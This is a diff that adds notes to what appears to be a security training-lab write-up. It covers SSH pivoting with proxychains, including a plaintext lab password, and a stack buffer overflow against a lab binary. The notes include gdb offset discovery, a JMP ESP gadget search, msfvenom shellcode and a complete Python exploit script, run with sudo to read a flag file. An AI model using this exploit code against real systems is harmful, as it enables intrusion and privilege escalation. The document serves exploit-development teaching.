@@ -383,6 +383,78 @@ student@lin-ops:~$ ssh student@localhost -p 15000 -D 9050
 student@lin-ops:~$ proxychains ssh comrade@192.168.28.111 -p 2222
        StudentWebExploitPassword
 
+comrade@web:~$ cd /.hidden
+comrade@web:/.hidden$ ls -la
+-rwxr-xr-x  1 root root 7352 Dec 30  2021 inventory.exe
+comrade@web:/.hidden$ gdb inventory.exe
+(gdb) run
+Starting program: /.hidden/inventory.exe 
+Press enter to view inventory: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+(gdb) info proc map
+0x804b000  0x806d000    0x22000        0x0 [heap]
+	0xf7def000 0xf7fc1000   0x1d2000        0x0 /lib32/libc-2.27.so
+	0xf7fc1000 0xf7fc2000     0x1000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fc2000 0xf7fc4000     0x2000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fc4000 0xf7fc5000     0x1000   0x1d4000 /lib32/libc-2.27.so
+	0xf7fc5000 0xf7fc8000     0x3000        0x0 
+	0xf7fcf000 0xf7fd1000     0x2000        0x0 
+	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
+	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
+	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+
+(gdb) find /b 0xf7def000, 0xffffe000, 0xff, 0xe4
+0xf7df1b51
+0xf7f6674b
+0xf7f72753
+
+student@lin-ops:~$ msfvenom -p linux/x86/exec CMD=cat -b '\x00' -f python
+buf += b"\xba\x4d\xd5\x81\x94\xda\xca\xd9\x74\x24\xf4\x5b"
+buf += b"\x2b\xc9\xb1\x0a\x31\x53\x15\x83\xc3\x04\x03\x53"
+buf += b"\x11\xe2\xb8\xbf\x8a\xcc\xdb\x12\xeb\x84\xf6\xf1"
+buf += b"\x7a\xb3\x60\xd9\x0f\x54\x70\x4d\xdf\xc6\x19\xe3"
+buf += b"\x96\xe4\x8b\x13\xac\xea\x2b\xe4\xce\x8b\x5f\xe4"
+buf += b"\x47\x1f\x16\x05\xaa\x1f"
+
+====EXPLOIT===
+#!/usr/bin/python2.7
+
+buf = "A" * 76 #get us to the EIP register
+'''
+0xf7df1b51 -> "\x51\x1b\xdf\xf7"
+0xf7f6674b
+0xf7f72753
+'''
+buf += "\x51\x1b\xdf\xf7" #set of instructions for JMP ESP
+
+buf +="\x90" * 10
+
+#payload here
+#student@lin-ops:~$ msfvenom -p linux/x86/exec CMD="cat /.secret/.verysecret.pdb" -b '\x00' -f python
+buf += b"\xba\xec\xb1\xb7\xdc\xdb\xcd\xd9\x74\x24\xf4\x58"
+buf += b"\x31\xc9\xb1\x11\x31\x50\x12\x03\x50\x12\x83\x04"
+buf += b"\x4d\x55\x29\xbe\xa5\xc2\x4b\x6c\xdc\x9a\x46\xf3"
+buf += b"\xa9\xbc\xf1\xdc\xda\x2a\x02\x4a\x32\xc9\x6b\xe4"
+buf += b"\xc5\xee\x3e\x10\xc8\xf0\xbe\xe0\x90\x91\xca\xc0"
+buf += b"\x79\x7c\x40\x65\xe5\xf2\xc3\x11\xc6\xdc\x7d\xbc"
+buf += b"\x6a\x58\xf1\x5b\xe8\xe8\x90\xd7\xc0\x7c\x3f\x75"
+buf += b"\x1d\x2a\xec\xf0\xfc\x19\x92"
+
+print(buf)
+===EXPLOIT===
+
+comrade@web:~$ chmod +x mybuff.py
+
+comrade@web:~$ sudo /.hidden/inventory.exe <<< $(/home/comrade/mybuff.py)
+ stuff
+ stuff
+ stuff
+ FLAG!!!
+
+
 
 
 
